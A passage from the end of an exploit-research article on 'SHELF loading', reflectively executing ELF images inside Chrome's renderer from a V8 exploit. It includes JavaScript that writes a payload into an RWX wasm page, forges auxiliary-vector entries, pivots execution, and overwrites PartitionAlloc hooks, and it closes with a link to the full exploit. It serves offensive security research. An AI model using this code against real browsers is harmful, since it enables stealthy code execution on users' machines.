</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">wasm_accessor</span>.<span style="color:#a6e22e">setUint8</span>(<span style="color:#a6e22e">i</span>, <span style="color:#a6e22e">stager</span>[<span style="color:#a6e22e">i</span>]);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">len</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">wasm_accessor</span>.<span style="color:#a6e22e">setUint8</span>(<span style="color:#a6e22e">shelf_delta</span><span style="color:#f92672">+</span><span style="color:#a6e22e">i</span>, <span style="color:#a6e22e">payload</span>[<span style="color:#a6e22e">i</span>]);
</span></span><span style="display:flex;"><span>}</span></span></code></pre></div>
At this point, all we have left to do is to write the SHELF image <code>Elf64_Auxv_t</code> instance in the SHELF&rsquo;s stack:</p>
<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">phdr_addr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">ftoi</span>(<span style="color:#a6e22e">stable_addrof</span>(<span style="color:#a6e22e">phdr</span>)) <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x28</span><span style="color:#a6e22e">n</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">phdr_addr_bstore</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">heap_accesor</span>.<span style="color:#a6e22e">getBigUint64</span>(Number(<span style="color:#a6e22e">phdr_addr</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span><span style="color:#a6e22e">n</span>), <span style="color:#66d9ef">true</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">stack_accesor</span>.<span style="color:#a6e22e">setBigUint64</span>(<span style="color:#ae81ff">0x00</span>, <span style="color:#a6e22e">AT_PHDR</span>, <span style="color:#66d9ef">true</span>);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">stack_accesor</span>.<span style="color:#a6e22e">setBigUint64</span>(<span style="color:#ae81ff">0x08</span>, <span style="color:#a6e22e">phdr_addr_bstore</span>, <span style="color:#66d9ef">true</span>);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">stack_accesor</span>.<span style="color:#a6e22e">setBigUint64</span>(<span style="color:#ae81ff">0x10</span>, <span style="color:#a6e22e">AT_PHNUM</span>, <span style="color:#66d9ef">true</span>);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">stack_accesor</span>.<span style="color:#a6e22e">setBigUint64</span>(<span style="color:#ae81ff">0x18</span>, <span style="color:#a6e22e">BigInt</span>(<span style="color:#a6e22e">G_AT_PHNUM</span>), <span style="color:#66d9ef">true</span>);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">stack_accesor</span>.<span style="color:#a6e22e">setBigUint64</span>(<span style="color:#ae81ff">0x20</span>, <span style="color:#a6e22e">AT_ENTRY</span>, <span style="color:#66d9ef">true</span>);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">stack_accesor</span>.<span style="color:#a6e22e">setBigUint64</span>(<span style="color:#ae81ff">0x28</span>, <span style="color:#a6e22e">ftoi</span>(<span style="color:#a6e22e">rwx_page_addr</span>) <span style="color:#f92672">+</span> <span style="color:#a6e22e">BigInt</span>(<span style="color:#a6e22e">G_AT_ENTRY</span>), <span style="color:#66d9ef">true</span>);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">stack_accesor</span>.<span style="color:#a6e22e">setBigUint64</span>(<span style="color:#ae81ff">0x30</span>, <span style="color:#a6e22e">AT_RANDOM</span>, <span style="color:#66d9ef">true</span>);  
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">stack_accesor</span>.<span style="color:#a6e22e">setBigUint64</span>(<span style="color:#ae81ff">0x38</span>, <span style="color:#a6e22e">ftoi</span>(<span style="color:#a6e22e">rwx_page_addr</span>), <span style="color:#66d9ef">true</span>);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">stack_accesor</span>.<span style="color:#a6e22e">setBigUint64</span>(<span style="color:#ae81ff">0x40</span>, <span style="color:#a6e22e">AT_PHENT</span>, <span style="color:#66d9ef">true</span>);  
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">stack_accesor</span>.<span style="color:#a6e22e">setBigUint64</span>(<span style="color:#ae81ff">0x48</span>, <span style="color:#a6e22e">sizeof_Elf64_Phdr</span>, <span style="color:#66d9ef">true</span>);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">stack_accesor</span>.<span style="color:#a6e22e">setBigUint64</span>(<span style="color:#ae81ff">0x50</span>, <span style="color:#a6e22e">AT_NULL</span>, <span style="color:#66d9ef">true</span>);  
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">stack_accesor</span>.<span style="color:#a6e22e">setBigUint64</span>(<span style="color:#ae81ff">0x58</span>, <span style="color:#ae81ff">0</span><span style="color:#a6e22e">n</span>, <span style="color:#66d9ef">true</span>);</span></span></code></pre></div>
Overall, the layout of our SHELF Image can be shown in the diagram below:</p>
<p><img src="https://tmpout.sh/2/img/2022-02-16_23-09.png#center" alt=""></p>
<p>To pivot control of execution to our RWX region, we can use our wasm function accessor to do:
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">wasm_entry</span>();</span></span></code></pre></div>Alternatively, if we would like to use any other technique to generate a RWX region, we can overwritte <code>PartitionAllocs</code> hooks to do so, much like we would do with <code>__free_hook</code> or <code>__malloc_hook</code> for glibc:</p>
<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#75715e">//base::PartitionAllocHooks::hooks_enabled_
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">chrome_accesor</span>.<span style="color:#a6e22e">setUint8</span>(<span style="color:#a6e22e">kHooksEnabled</span>, <span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span><span style="color:#75715e">//base::PartitionAllocHooks::free_observer_hook_
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">chrome_accesor</span>.<span style="color:#a6e22e">setBigUint64</span>(<span style="color:#a6e22e">kFreeObserverHook</span>, <span style="color:#a6e22e">ftoi</span>(<span style="color:#a6e22e">rwx_page_addr</span>), <span style="color:#66d9ef">true</span>);</span></span></code></pre></div>
Below is a screenshot of our test involving the execution of a SHELF image compiled with <em>libm</em> on Chrome launched with the following flags :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>chrome --no-sandbox --user-data-dir<span style="color:#f92672">=</span>/tmp</span></span></code></pre></div>
<p><img src="https://tmpout.sh/2/img/aaa.gif#center" alt=""></p>
<p>if we check the process tree of chrome we will see the following:</p>
<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>    ├─chrome,104737   	   &lt;-- Browser Process
</span></span><span style="display:flex;"><span>    │   ├─chrome,104739
</span></span><span style="display:flex;"><span>    │   │   ├─chrome,104762  &lt;-- GPU Process
</span></span><span style="display:flex;"><span>    │   │       ....
</span></span><span style="display:flex;"><span>    │   ├─chrome,104740
</span></span><span style="display:flex;"><span>    │   │   ├─chrome,104948  &lt;-- Renderer process
</span></span><span style="display:flex;"><span>    │   │   │   ├─{chrome},104953
</span></span><span style="display:flex;"><span>    │   │   │   ├─{chrome},104955
</span></span><span style="display:flex;"><span>    │   │   │   ├─{chrome},104956
</span></span><span style="display:flex;"><span>    │   │   │   ├─{chrome},104961
</span></span><span style="display:flex;"><span>    │   │   │   ├─{chrome},104964
</span></span><span style="display:flex;"><span>    │   │   │   ├─{chrome},104968
</span></span><span style="display:flex;"><span>    │   │   │   ├─{chrome},104970
</span></span><span style="display:flex;"><span>    │   │   │   ├─{chrome},104971
</span></span><span style="display:flex;"><span>    │   │   │   ├─{chrome},104972
</span></span><span style="display:flex;"><span>    │   │   │   ├─{chrome},104973
</span></span><span style="display:flex;"><span>    │   │   │   └─{chrome},105004</span></span></code></pre></div>
As we can observe, there are no anomalies in process-tree hierarchy.
This is a simple visual example, but I hope it will give the reader a glance of what kind of capability we can achieve with SHELF loading. The full exploit can be found <a href="https://github.com/ulexec/ChromeSHELFLoader">here</a></p>
<!-- raw HTML omitted -->
<hr>
<h2 id="conclusion">Conclusion<a href="#conclusion" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<p>Although reflectively loading ELF images from the browser sounds like a bit of an overkill, in my opinion it is a realistic capability to achieve with SHELF loading in real-life exploit chains, even for chains requiring a SBX exploit. As shown by a Theori blog written by <a href="https://blog.theori.io/research/escaping-chrome-sandbox/">Tim Becker</a>, there are ways to implement platform-agnostic SBX exploits to ultimately disable the Chrome Sandbox for the subsequent use of a second unsandboxed renderer exploit.</p>
<p>Nevertheless, SHELF loading is not a universal technique for every browser exploit, and there may be scenarios in which other techniques to deploy ELF files in memory would be more convenient. However, I still believe that SHELF loading is an interesting avenue for chaining consecutive payloads with anti-forensic capabilities for browser exploits in which arbitrary read/write primitives are granted, which has been a common trait for most V8 exploitable bugs.</p>
<p>I would like to finalize showing my gratitude to the Tmp.0ut comunity, specifically to @elfmaster, @sblip, @TMZ, @netspooky, @richinseattle &amp; @David3141593. Last by not least, I would also like to show my appreciation to the content @btiszka has published in relation to Chrome exploitation, as it has been a great reference and a personal source of motivation.</p>
<p>Thank you for reading, and see you next year!</p>
<p>&ndash; @ulexec</p>

      </div></div>

  

  
    

  
</article>

  </div>

  
    <footer class="footer">
  <div class="footer__inner">
    
      <div class="copyright copyright--user">
        <span>Ignacio Sanmillan</span>
    
      </div>
  </div>
</footer>






<script type="text/javascript" src="/bundle.min.js"></script>





  
</div>

</body>
</html>
